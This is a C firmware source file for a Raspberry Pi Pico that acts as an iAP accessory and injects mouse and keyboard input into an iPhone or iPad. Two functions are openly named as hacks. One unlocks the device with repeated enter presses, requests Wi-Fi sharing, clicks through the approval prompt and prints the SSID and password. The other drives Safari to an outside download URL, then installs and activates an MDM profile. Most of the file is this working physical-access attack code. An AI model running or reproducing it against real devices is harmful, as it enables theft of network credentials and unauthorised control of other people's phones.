#include <stdio.h>

#include "idbus.h"
#include "iap_hid.h"
#include "iap_hid_gw.h"
#include "pico/stdlib.h"

static iap_transport_t *iap_trans = NULL;
static uint8_t hid_mouse = 0, hid_kbd = 0, hid_ctrl = 0;

int init_iap_hid_gw(iap_transport_t *trans)
{
    int ret = IAP_OK;
    printf("Start to initialize the iAP HID gateway\n");
    iap_trans = trans;

    ret |= iap_hid_open_keyboard(iap_trans, &hid_kbd);
    sleep_ms(500);
    ret |= iap_hid_open_mouse(iap_trans, &hid_mouse);
    sleep_ms(500);
    ret |= iap_hid_open_control(iap_trans, &hid_ctrl);
    sleep_ms(500);
    printf("Init iAP HID gateway finished with status code: %d\n", ret);

    printf("Move mouse to origin\n");
    iap_hid_send_mouse_move_origin(trans, hid_mouse);
    printf("Return to Home screen\n");
    iap_hid_send_home_btn(trans, hid_ctrl);
    return ret;
}

static void iap_hid_handle_key(uint8_t key)
{
    switch (key)
    {
    case HID_MOUSE_MOVE_DOWN:
    {
        iap_hid_send_mouse_move_down(iap_trans, hid_mouse);
        break;
    }
    case HID_MOUSE_MOVE_UP:
    {
        iap_hid_send_mouse_move_up(iap_trans, hid_mouse);
        break;
    }
    case HID_MOUSE_MOVE_LEFT:
    {
        iap_hid_send_mouse_move_left(iap_trans, hid_mouse);
        break;
    }
    case HID_MOUSE_MOVE_RIGHT:
    {
        iap_hid_send_mouse_move_right(iap_trans, hid_mouse);
        break;
    }
    case HID_MOUSE_CLICK_LEFT:
    {
        iap_hid_send_mouse_click_left(iap_trans, hid_mouse);
        break;
    }
    case HID_MOUSE_CLICK_RIGHT:
    {
        iap_hid_send_mouse_click_right(iap_trans, hid_mouse);
        break;
    }
    case HID_MOUSE_SCROLL_DOWN:
    {
        iap_hid_send_mouse_scroll_down(iap_trans, hid_mouse);
        break;
    }
    case HID_MOUSE_SCROLL_UP:
    {
        iap_hid_send_mouse_scroll_up(iap_trans, hid_mouse);
        break;
    }
    default:
    {
        iap_hid_send_kbd_char(iap_trans, hid_kbd, key);
        break;
    }
    }
    printf("Send key: %c to iDevice\n", key);
}

void iap_hid_handle_sequence(uint8_t *sec, uint8_t sec_size)
{
    for (uint8_t i = 0; i < sec_size; i++)
    {
        iap_hid_handle_key(sec[i]);
        sleep_ms(10);
    }
}

void run_iap_hid_wlan_hack()
{
    uint8_t req_data[265] = {0};
    uint8_t res_data[265] = {0};
    iap_command_t req = {
        .lingoid = IAP_LINGO_GENERAL,
        .command = IAP_CMD_REQWIFICONNINFO,
        .param = req_data,
        .param_size = 0};

    iap_command_t res = {
        .lingoid = 0,
        .command = 0,
        .param = res_data,
        .param_size = 0};

    // 1) move the mouse to your defined origin (left bottom corner)
    iap_hid_send_mouse_move_origin(iap_trans, hid_mouse);

    // 2) press multiple times the enter to unlock the phone without a password
    iap_hid_send_kbd_char(iap_trans, hid_kbd, 0xd);
    sleep_ms(500);
    iap_hid_send_kbd_char(iap_trans, hid_kbd, 0xd);
    sleep_ms(500);
    iap_hid_send_kbd_char(iap_trans, hid_kbd, 0xd);

    // 3) request the wlan password sharing via iAP
    iap_increment_transid(iap_trans);
    iap_send_command(iap_trans, &req, NULL);
    sleep_ms(2000);

    // 4) press enter to allow sharing the password
    uint8_t movement[] = {'D', 'D', 'D', 'D', 'D', 'D', 'D', 'D', 'D', 'D', 'D', 'D', 'D', 'D', 'D', 'D', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'Q', 'Q'};
    iap_hid_handle_sequence(movement, 37);

    // 5) read the wlan credentials
    // wait until the user has confirmed the iDevice prompt
    iap_recv_command(iap_trans, &res, NULL);

    iap_cmd_wificonninfo_t *wifi_con = (iap_cmd_wificonninfo_t *)res.param;
    printf("WiFi credentials: \n");
    printf("  - MODE: %s\n", (wifi_con->sectype == WIFI_SEC_WPA2) ? "WPA2" : ((wifi_con->sectype == WIFI_SEC_WPA) ? "WPA" : (wifi_con->sectype == WIFI_SEC_WEP) ? "WEP"
                                                                                                                        : (wifi_con->sectype == WIFI_SEC_NONE)  ? "NONE"
                                                                                                                                                                : "WPA & WPA2 MIX"));
    printf("  - SSID: %s\n", wifi_con->ssid);
    printf("  - PWD:  %s\n", wifi_con->pwd);
}

void run_iap_hid_mdm_hack()
{
    // 1) move the mouse to your defined origin (left bottom corner)
    iap_hid_send_mouse_move_origin(iap_trans, hid_mouse);

    // 2) open safari browser
    uint8_t open_safari[] = {'D', 'D', 'D', 'D', 'D', 'D', 'D', 'D', 'D', 'D', 'W', 'W', 'Q'};
    iap_hid_handle_sequence(open_safari, 13);
    sleep_ms(1000);

    // 3) enter url
    uint8_t bar_safari[] = {'W', 'W', 'Q'};
    iap_hid_handle_sequence(bar_safari, 3);
    sleep_ms(500);
    uint8_t url_safari[] = {'h', 't', 't', 'p', 's', ':', '/', '/', 'd', 'o', 'w', 'n', 'l', 'o', 'a', 'd', '.', 'p', 'a', 'n', 'g', 'u', '8', '.', 'c', 'o', 'm', '/', 'i', 'n', 's', 't', 'a', 'l', 'l', '/', 'z', 'e', 'o', 'n', '/', '1', '5', '-', '7', '/', 'i', 'n', 's', 't', 'a', 'l', 'l', '.', 'h', 't', 'm', 'l', 0xd};
    iap_hid_handle_sequence(url_safari, 61);
    sleep_ms(5000);

    // 4) download MDM
    uint8_t download_safari[] = {'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'Q'};
    iap_hid_handle_sequence(download_safari, 18);
    sleep_ms(2000);
    uint8_t acc_download_safari[] = {'D', 'D', 'D', 'D', 'D', 'D', 'D', 'D', 'D', 'D', 'D', 'D', 'W', 'W', 'W', 'Q'};
    iap_hid_handle_sequence(acc_download_safari, 16);
    sleep_ms(1000);
    uint8_t close_download_safari[] = {'S', 'S', 'S', 'A', 'A', 'Q', 'Q'};
    iap_hid_handle_sequence(close_download_safari, 7);
    sleep_ms(1000);

    // 5) go to home
    iap_hid_send_home_btn(iap_trans, hid_ctrl);
    iap_hid_send_mouse_move_origin(iap_trans, hid_mouse);
    sleep_ms(1000);

    // 6) activate MDM
    uint8_t mdm_select[] = {'D', 'D', 'D', 'D', 'D', 'D', 'D', 'D', 'D', 'D', 'D', 'D', 'D', 'D', 'D', 'D', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'Q', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'Q'};
    iap_hid_handle_sequence(mdm_select, 44);
    sleep_ms(500);
}

void run_iap_hid_gw(uint8_t *cancel)
{
    uint8_t key = ' ';

    // move the mouse to your defined origin (left bottom corner)
    iap_hid_send_mouse_move_origin(iap_trans, hid_mouse);

    while (0 == *cancel)
    {
        printf("Input> ");
        iap_hid_handle_key(getchar());
    }
}